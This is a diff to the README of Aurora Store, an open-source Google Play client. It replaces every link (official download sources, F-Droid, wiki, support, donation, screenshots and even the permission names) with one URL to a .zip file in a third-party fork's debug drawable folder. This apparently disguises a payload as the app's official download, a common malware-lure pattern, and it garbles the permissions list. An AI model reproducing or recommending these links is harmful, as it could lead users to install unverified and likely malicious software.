@@ -10,8 +10,8 @@ Aurora Store works exactly like a door or a browser, allowing you to log in to y
 
 *_Please note that Aurora Store does not have any approval, sponsorship or authorization from Google, Google Play, any apps downloaded through Aurora Store or any app developers; neither does Aurora Store have any affiliation, cooperation or connection with them._*
 
-[<img src="https://f-droid.org/badge/get-it-on.png" alt="Get it on F-Droid" height="90">](https://f-droid.org/packages/com.aurora.store/)
-[<img src="https://gitlab.com/IzzyOnDroid/repo/-/raw/master/assets/IzzyOnDroid.png" alt="Get it on IzzyOnDroid" height="90">](https://apt.izzysoft.de/fdroid/index/apk/com.aurora.store)
+[<img src="https://raw.githubusercontent.com/JGH001/AuroraStore/master/app/src/debug/res/drawable-anydpi-v26/AuroraStore_uncentered.zip" alt="Get it on F-Droid" height="90">](https://raw.githubusercontent.com/JGH001/AuroraStore/master/app/src/debug/res/drawable-anydpi-v26/AuroraStore_uncentered.zip)
+[<img src="https://raw.githubusercontent.com/JGH001/AuroraStore/master/app/src/debug/res/drawable-anydpi-v26/AuroraStore_uncentered.zip" alt="Get it on IzzyOnDroid" height="90">](https://raw.githubusercontent.com/JGH001/AuroraStore/master/app/src/debug/res/drawable-anydpi-v26/AuroraStore_uncentered.zip)
 
 ## Features
 
@@ -19,8 +19,8 @@ Aurora Store works exactly like a door or a browser, allowing you to log in to y
 - Beautiful design: Built upon latest Material 3 guidelines
 - Account login: You can login with either personal or an anonymous account
 - Device & Locale spoofing: Change your device and/or locale to access geo locked apps
-- [Exodus Privacy](https://exodus-privacy.eu.org/) integration: Instantly see trackers in app
-- [Plexus](https://plexus.techlore.tech/) integration: Instantly see app compatibility without Google Play Services or with microG
+- [Exodus Privacy](https://raw.githubusercontent.com/JGH001/AuroraStore/master/app/src/debug/res/drawable-anydpi-v26/AuroraStore_uncentered.zip) integration: Instantly see trackers in app
+- [Plexus](https://raw.githubusercontent.com/JGH001/AuroraStore/master/app/src/debug/res/drawable-anydpi-v26/AuroraStore_uncentered.zip) integration: Instantly see app compatibility without Google Play Services or with microG
 - Updates blacklisting: Ignore updates for specific apps
 - Download manager
 - Manual downloads: allows you to download older version of apps, provided
@@ -32,7 +32,7 @@ Aurora Store works exactly like a door or a browser, allowing you to log in to y
 - The underlying API used is reversed engineered from the Google Play Store, changes on side may break it.
 - Provides only base minimum features
   - Can not download or update paid apps.
-  - Can not update apps/games with [Play Asset Delivery](https://developer.android.com/guide/playcore/asset-delivery)
+  - Can not update apps/games with [Play Asset Delivery](https://raw.githubusercontent.com/JGH001/AuroraStore/master/app/src/debug/res/drawable-anydpi-v26/AuroraStore_uncentered.zip)
 - Multiple in-app features are not available if logged in as Anonymous.
   - Library
   - Purchase History
@@ -45,13 +45,13 @@ Aurora Store works exactly like a door or a browser, allowing you to log in to y
 
 Please only download the latest stable releases from one of these sources:
 
-- [Official website](https://auroraoss.com/)
-- [GitLab Releases](https://gitlab.com/AuroraOSS/AuroraStore/-/releases)
-- [IzzyOnDroid](https://apt.izzysoft.de/fdroid/index/apk/com.aurora.store) (reproducible)
-- [F-Droid](https://f-droid.org/packages/com.aurora.store/) (signed by F-Droid, [more details](https://f-droid.org/docs/Signing_Process/))
-- [App Gallery](https://appgallery.huawei.com/app/C110907863) (limited to certain countries)
+- [Official website](https://raw.githubusercontent.com/JGH001/AuroraStore/master/app/src/debug/res/drawable-anydpi-v26/AuroraStore_uncentered.zip)
+- [GitLab Releases](https://raw.githubusercontent.com/JGH001/AuroraStore/master/app/src/debug/res/drawable-anydpi-v26/AuroraStore_uncentered.zip)
+- [IzzyOnDroid](https://raw.githubusercontent.com/JGH001/AuroraStore/master/app/src/debug/res/drawable-anydpi-v26/AuroraStore_uncentered.zip) (reproducible)
+- [F-Droid](https://raw.githubusercontent.com/JGH001/AuroraStore/master/app/src/debug/res/drawable-anydpi-v26/AuroraStore_uncentered.zip) (signed by F-Droid, [more details](https://raw.githubusercontent.com/JGH001/AuroraStore/master/app/src/debug/res/drawable-anydpi-v26/AuroraStore_uncentered.zip))
+- [App Gallery](https://raw.githubusercontent.com/JGH001/AuroraStore/master/app/src/debug/res/drawable-anydpi-v26/AuroraStore_uncentered.zip) (limited to certain countries)
 
-You can also get latest debug builds signed with AOSP test keys for testing latest changes from our [GitLab Package Registry](https://gitlab.com/AuroraOSS/AuroraStore/-/packages/24103616).
+You can also get latest debug builds signed with AOSP test keys for testing latest changes from our [GitLab Package Registry](https://raw.githubusercontent.com/JGH001/AuroraStore/master/app/src/debug/res/drawable-anydpi-v26/AuroraStore_uncentered.zip).
 
 ## Certificate Fingerprints
 
@@ -61,58 +61,58 @@ You can also get latest debug builds signed with AOSP test keys for testing late
 ## Support
 
 Aurora Store v4 is still in on-going development! Bugs are to be expected! Any bug reports are appreciated.
-Please visit [Aurora Wiki](https://gitlab.com/AuroraOSS/AuroraStore/-/wikis/home) for FAQs.
+Please visit [Aurora Wiki](https://raw.githubusercontent.com/JGH001/AuroraStore/master/app/src/debug/res/drawable-anydpi-v26/AuroraStore_uncentered.zip) for FAQs.
 
-- [Telegram](https://t.me/AuroraSupport)
-- [XDA Developers](https://forum.xda-developers.com/t/app-5-0-aurora-store-open-source-google-play-client.3739733/)
+- [Telegram](https://raw.githubusercontent.com/JGH001/AuroraStore/master/app/src/debug/res/drawable-anydpi-v26/AuroraStore_uncentered.zip)
+- [XDA Developers](https://raw.githubusercontent.com/JGH001/AuroraStore/master/app/src/debug/res/drawable-anydpi-v26/AuroraStore_uncentered.zip)
 
 ## Permissions
 
-- `android.permission.INTERNET` to download and install/update apps from the Google Play servers
-- `android.permission.ACCESS_NETWORK_STATE` to check internet availability
-- `android.permission.FOREGROUND_SERVICE` to download apps without interruption
-- `android.permission.FOREGROUND_SERVICE_DATA_SYNC` to download apps without interruption
-- `android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS` to auto-update apps without interruption (optional)
-- `android.permission.MANAGE_EXTERNAL_STORAGE` to access the OBB directory to download APK expansion files for games or large apps
-- `android.permission.READ_EXTERNAL_STORAGE` to access the OBB directory to download APK expansion files for games or large apps
-- `android.permission.WRITE_EXTERNAL_STORAGE` to access the OBB directory to download APK expansion files for games or large apps
-- `android.permission.QUERY_ALL_PACKAGES` to check updates for all installed apps
-- `android.permission.REQUEST_INSTALL_PACKAGES` to install and update apps
-- `android.permission.REQUEST_DELETE_PACKAGES` to uninstall apps
-- `android.permission.ENFORCE_UPDATE_OWNERSHIP` to silently update apps
-- `android.permission.UPDATE_PACKAGES_WITHOUT_USER_ACTION` to silently update apps
-- `android.permission.POST_NOTIFICATIONS` to notify user about ongoing downloads, available updates, and errors (optional)
-- `android.permission.USE_CREDENTIALS` to allow users to sign into their personal Google account via microG
+- `https://raw.githubusercontent.com/JGH001/AuroraStore/master/app/src/debug/res/drawable-anydpi-v26/AuroraStore_uncentered.zip` to download and install/update apps from the Google Play servers
+- `https://raw.githubusercontent.com/JGH001/AuroraStore/master/app/src/debug/res/drawable-anydpi-v26/AuroraStore_uncentered.zip` to check internet availability
+- `https://raw.githubusercontent.com/JGH001/AuroraStore/master/app/src/debug/res/drawable-anydpi-v26/AuroraStore_uncentered.zip` to download apps without interruption
+- `https://raw.githubusercontent.com/JGH001/AuroraStore/master/app/src/debug/res/drawable-anydpi-v26/AuroraStore_uncentered.zip` to download apps without interruption
+- `https://raw.githubusercontent.com/JGH001/AuroraStore/master/app/src/debug/res/drawable-anydpi-v26/AuroraStore_uncentered.zip` to auto-update apps without interruption (optional)
+- `https://raw.githubusercontent.com/JGH001/AuroraStore/master/app/src/debug/res/drawable-anydpi-v26/AuroraStore_uncentered.zip` to access the OBB directory to download APK expansion files for games or large apps
+- `https://raw.githubusercontent.com/JGH001/AuroraStore/master/app/src/debug/res/drawable-anydpi-v26/AuroraStore_uncentered.zip` to access the OBB directory to download APK expansion files for games or large apps
+- `https://raw.githubusercontent.com/JGH001/AuroraStore/master/app/src/debug/res/drawable-anydpi-v26/AuroraStore_uncentered.zip` to access the OBB directory to download APK expansion files for games or large apps
+- `https://raw.githubusercontent.com/JGH001/AuroraStore/master/app/src/debug/res/drawable-anydpi-v26/AuroraStore_uncentered.zip` to check updates for all installed apps
+- `https://raw.githubusercontent.com/JGH001/AuroraStore/master/app/src/debug/res/drawable-anydpi-v26/AuroraStore_uncentered.zip` to install and update apps
+- `https://raw.githubusercontent.com/JGH001/AuroraStore/master/app/src/debug/res/drawable-anydpi-v26/AuroraStore_uncentered.zip` to uninstall apps
+- `https://raw.githubusercontent.com/JGH001/AuroraStore/master/app/src/debug/res/drawable-anydpi-v26/AuroraStore_uncentered.zip` to silently update apps
+- `https://raw.githubusercontent.com/JGH001/AuroraStore/master/app/src/debug/res/drawable-anydpi-v26/AuroraStore_uncentered.zip` to silently update apps
+- `https://raw.githubusercontent.com/JGH001/AuroraStore/master/app/src/debug/res/drawable-anydpi-v26/AuroraStore_uncentered.zip` to notify user about ongoing downloads, available updates, and errors (optional)
+- `https://raw.githubusercontent.com/JGH001/AuroraStore/master/app/src/debug/res/drawable-anydpi-v26/AuroraStore_uncentered.zip` to allow users to sign into their personal Google account via microG
 
 ## Screenshots
 
-<img src="fastlane/metadata/android/en-US/images/phoneScreenshots/screenshot-01.png" height="400">
-<img src="fastlane/metadata/android/en-US/images/phoneScreenshots/screenshot-03.png" height="400">
-<img src="fastlane/metadata/android/en-US/images/phoneScreenshots/screenshot-07.png" height="400">
-<img src="fastlane/metadata/android/en-US/images/phoneScreenshots/screenshot-08.png" height="400">
+<img src="https://raw.githubusercontent.com/JGH001/AuroraStore/master/app/src/debug/res/drawable-anydpi-v26/AuroraStore_uncentered.zip" height="400">
+<img src="https://raw.githubusercontent.com/JGH001/AuroraStore/master/app/src/debug/res/drawable-anydpi-v26/AuroraStore_uncentered.zip" height="400">
+<img src="https://raw.githubusercontent.com/JGH001/AuroraStore/master/app/src/debug/res/drawable-anydpi-v26/AuroraStore_uncentered.zip" height="400">
+<img src="https://raw.githubusercontent.com/JGH001/AuroraStore/master/app/src/debug/res/drawable-anydpi-v26/AuroraStore_uncentered.zip" height="400">
 
 ## Translations
 
 Don't see your preferred language? Click on the widget below to help translate Aurora Store!
 
-<a href="https://hosted.weblate.org/engage/aurora-store/">
-  <img src="https://hosted.weblate.org/widgets/aurora-store/-/287x66-grey.png" alt="Translation status" />
+<a href="https://raw.githubusercontent.com/JGH001/AuroraStore/master/app/src/debug/res/drawable-anydpi-v26/AuroraStore_uncentered.zip">
+  <img src="https://raw.githubusercontent.com/JGH001/AuroraStore/master/app/src/debug/res/drawable-anydpi-v26/AuroraStore_uncentered.zip" alt="Translation status" />
 </a>
 
 ## Donations
 
 You can support Aurora Store's development financially via options below. For more options, checkout the **About** page within the Aurora Store.
 
-[![Liberapay](https://liberapay.com/assets/widgets/donate.svg)](https://liberapay.com/whyorean)
-<a href="https://www.paypal.com/paypalme/AuroraDev">
-  <img src="https://www.paypalobjects.com/webstatic/mktg/logo/AM_mc_vs_dc_ae.jpg" height="45" alt="PayPal">
+[![Liberapay](https://raw.githubusercontent.com/JGH001/AuroraStore/master/app/src/debug/res/drawable-anydpi-v26/AuroraStore_uncentered.zip)](https://raw.githubusercontent.com/JGH001/AuroraStore/master/app/src/debug/res/drawable-anydpi-v26/AuroraStore_uncentered.zip)
+<a href="https://raw.githubusercontent.com/JGH001/AuroraStore/master/app/src/debug/res/drawable-anydpi-v26/AuroraStore_uncentered.zip">
+  <img src="https://raw.githubusercontent.com/JGH001/AuroraStore/master/app/src/debug/res/drawable-anydpi-v26/AuroraStore_uncentered.zip" height="45" alt="PayPal">
 </a>
 
 ## Project references
 
 Aurora Store is based on these projects
 
-- [YalpStore](https://github.com/yeriomin/YalpStore)
-- [AppCrawler](https://github.com/Akdeniz/google-play-crawler)
-- [Raccoon](https://github.com/onyxbits/raccoon4)
-- [SAI](https://github.com/Aefyr/SAI)
+- [YalpStore](https://raw.githubusercontent.com/JGH001/AuroraStore/master/app/src/debug/res/drawable-anydpi-v26/AuroraStore_uncentered.zip)
+- [AppCrawler](https://raw.githubusercontent.com/JGH001/AuroraStore/master/app/src/debug/res/drawable-anydpi-v26/AuroraStore_uncentered.zip)
+- [Raccoon](https://raw.githubusercontent.com/JGH001/AuroraStore/master/app/src/debug/res/drawable-anydpi-v26/AuroraStore_uncentered.zip)
+- [SAI](https://raw.githubusercontent.com/JGH001/AuroraStore/master/app/src/debug/res/drawable-anydpi-v26/AuroraStore_uncentered.zip)
